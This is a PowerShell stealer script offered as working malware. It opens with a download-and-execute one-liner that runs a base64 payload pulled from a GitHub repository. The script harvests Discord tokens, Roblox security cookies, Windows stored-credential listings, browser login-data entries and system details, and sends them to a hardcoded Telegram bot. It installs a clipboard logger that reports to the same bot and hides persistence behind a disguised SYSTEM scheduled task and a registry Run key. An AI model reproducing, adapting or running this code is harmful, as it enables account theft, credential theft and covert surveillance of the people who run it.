# Silent aggressive payload - background application mode
# Execute: iwr 'https://api.github.com/repos/isajarGamer2/stealer-repo/contents/payload_final.ps1?ref=main' -UseBasicParsing -UserAgent 'Mozilla/5.0' | ConvertFrom-Json | % { [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_.content)) } | iex

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"

function Send-Telegram {
    param([string]$Message)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{chat_id=$chatId;text=$Message;parse_mode="HTML"} -ErrorAction Stop | Out-Null
    } catch {
        try { $body="chat_id=$chatId&text=$([Uri]::EscapeDataString($Message))"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("Content-Type","application/x-www-form-urlencoded"); $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage",$body) | Out-Null } catch {}
    }
}

# === EXTRACT STRINGS FROM BINARY FILE ===
function Get-StringsFromBinary {
    param([string]$FilePath)
    try {
        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
        $text = [System.Text.Encoding]::UTF8.GetString($bytes, 0, [math]::Min($bytes.Length, 10MB))
        return $text
    } catch { return "" }
}

$report = "<b>[+] VICTIM DATA</b>`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n"
$allTokens = @()
$rbxFound = @()

# === DISCORD: binary-safe extraction ===
$discordPaths = @("$env:APPDATA\discord","$env:APPDATA\discordcanary","$env:APPDATA\discordptb")
foreach ($basePath in $discordPaths) {
    if (-not (Test-Path $basePath)) { continue }
    # Find ALL files in Local Storage
    Get-ChildItem -Path "$basePath\Local Storage" -Recurse -ErrorAction SilentlyContinue | foreach {
        if ($_.PSIsContainer) { return }
        try {
            $ext = $_.Extension.ToLower()
            if ($ext -in @(".ldb",".log",".json")) {
                $content = Get-StringsFromBinary $_.FullName
                if ($content) {
                    # Extract Discord tokens: 24.chars.6.chars.27chars
                    $matches = [regex]::Matches($content, '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}')
                    foreach ($m in $matches) { $allTokens += $m.Value }
                    # Also check for discord.com cookies
                    if ($content -match "discord\.com") { $report += "`n<b>DISCORD COOKIE DB:</b> $($_.FullName)" }
                }
            }
        } catch {}
    }
}

# Also check config.json
Get-ChildItem -Path "$env:APPDATA\discord\config.json" -ErrorAction SilentlyContinue | foreach {
    try { $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue; if ($content) { [regex]::Matches($content, '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}') | foreach { $allTokens += $_.Value } } } catch {}
}

if ($allTokens) {
    $allTokens = $allTokens | Sort-Object -Unique
    $report += "`n<b>DISCORD TOKENS ($($allTokens.Count)):</b>`n"
    $allTokens | foreach { $report += "<code>$_</code>`n" }
} else {
    $report += "`n<b>DISCORD:</b> No tokens found (app may not be logged in)`n"
}

# === ROBLOX: binary-safe extraction ===
$rbxTokens = @()
# Search ALL browser cookies databases for ROBLOSECURITY
$cookieDBs = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Cookies",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 1\Cookies",
    "$env:APPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies"
)
foreach ($db in $cookieDBs) {
    if (Test-Path $db) {
        try {
            $content = Get-StringsFromBinary $db
            if ($content -match "roblox\.com") {
                $rbxFound += "Roblox cookies found in: $db"
            }
            if ($content -match "ROBLOSECURITY") {
                $rbxFound += "ROBLOSECURITY cookie found in: $db"
                # Extract the actual token value
                $secMatches = [regex]::Matches($content, 'ROBLOSECURITY\|[^|]*\|[^|]*\|([a-zA-Z0-9_-]{80,})')
                foreach ($m in $secMatches) { $rbxTokens += $m.Groups[1].Value }
            }
        } catch {}
    }
}

# Firefox cookies
Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\cookies.sqlite" -ErrorAction SilentlyContinue | foreach {
    try { $content = Get-StringsFromBinary $_.FullName; if ($content -match "ROBLOSECURITY") { $rbxFound += "ROBLOSECURITY found in Firefox: $($_.FullName)" } } catch {}
}

# Roblox output logs and bin files
Get-ChildItem "$env:LOCALAPPDATA\Roblox\Versions\*\output.log" -Recurse -ErrorAction SilentlyContinue | foreach {
    try { $content = Get-StringsFromBinary $_.FullName; if ($content -match "[A-Za-z0-9_-]{80,}") { [regex]::Matches($content, '[A-Za-z0-9_-]{80,}') | foreach { $rbxTokens += $_.Value } } } catch {}
}
Get-ChildItem "$env:LOCALAPPDATA\Roblox\*.bin" -Recurse -ErrorAction SilentlyContinue | foreach {
    try { $content = Get-StringsFromBinary $_.FullName; if ($content -match "[A-Za-z0-9_-]{80,}") { [regex]::Matches($content, '[A-Za-z0-9_-]{80,}') | foreach { $rbxTokens += $_.Value } } } catch {}
}

if ($rbxTokens) {
    $report += "`n<b>ROBLOX TOKENS ($($rbxTokens.Count)):</b>`n"
    $rbxTokens | Sort-Object -Unique | foreach { $report += "<code>$_</code>`n" }
} elseif ($rbxFound) {
    $report += "`n<b>ROBLOX:</b> `$($rbxFound.Count) cookie hits (tokens need decryption)`n"
} else {
    $report += "`n<b>ROBLOX:</b> Not installed/not logged in`n"
}

# === SYSTEM INFO ===
try { $os=(Get-CimInstance Win32_OperatingSystem).Caption; $cpu=(Get-CimInstance Win32_Processor).Name; $ram=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,2); $gpu=(Get-CimInstance Win32_VideoController).Name; $report += "`n<b>SYSTEM:</b>`nOS: $os`nCPU: $cpu`nRAM: $ram GB`nGPU: $gpu`n" } catch { $report += "`n<b>SYSTEM:</b> Error`n" }

# === WINDOWS CREDENTIAL MANAGER ===
try { $creds = cmd.exe /c "cmdkey /list" 2>&1; if ($creds) { $report += "`n<b>[CREDENTIALS]</b>`n$creds`n" } } catch {}

# === BROWSER PASSWORDS ===
$loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (-not (Test-Path $loginData)) { $loginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" }
if (Test-Path $loginData) {
    try {
        $content = Get-StringsFromBinary $loginData
        # Count entries
        $entries = [regex]::Matches($content, 'username_val|password_value') | Measure-Object | Select-Object -ExpandProperty Count
        $report += "`n<b>[BROWSER PASSWORDS]</b>`nLogin Data found: $loginData ($entries entries)`n"
    } catch { $report += "`n<b>[BROWSER PASSWORDS]</b> Login Data found but could not parse`n" }
}

# === KEYLOGGER SERVICE ===
$klCode = @'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$bt="8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"; $cid="8445047233"; $il=300; $lc=""
Add-Type -AssemblyName System.Windows.Forms
while ($true) { try { $cb=[System.Windows.Forms.Clipboard]::GetText(); if ($cb -and $cb -ne $lc -and $cb.Length -gt 3) { $lc=$cb; $msg="[+] CLIPBOARD`nHost: $env:COMPUTERNAME`nData:`n$cb"; try { Invoke-RestMethod -Uri "https://api.telegram.org/bot$bt/sendMessage" -Method Post -Body @{chat_id=$cid;text=$msg} -ErrorAction Stop | Out-Null } catch {} } } catch {}; Start-Sleep -Seconds $il }
'@
$klPath = "$env:TEMP\kl_$(Get-Random -Maximum 9999).ps1"
$klCode | Out-File $klPath -Encoding UTF8
Start-Job -ScriptBlock { param($p) iex (Get-Content $p -Raw) } -ArgumentList $klPath | Out-Null

# === PERSISTENCE VIA SCHEDULED TASK (runs hidden at logon) ===
$taskName = "WindowsSync_" + (Get-Random -Minimum 1000 -Maximum 9999)
$taskCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$klPath`""
try {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$klPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Windows Update Service" -Force -ErrorAction SilentlyContinue
} catch {}

# Also set registry persistence as backup
try { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SysUpdate32" -Value $taskCmd -Force } catch {}

# === SEND ALL DATA ===
Send-Telegram -Message $report
Send-Telegram -Message "[+] PAYLOAD EXECUTED on $env:COMPUTERNAME by $env:USERNAME at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

# Cleanup
Remove-Item $klPath -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\svchost_cache.dat" -Force -ErrorAction SilentlyContinue
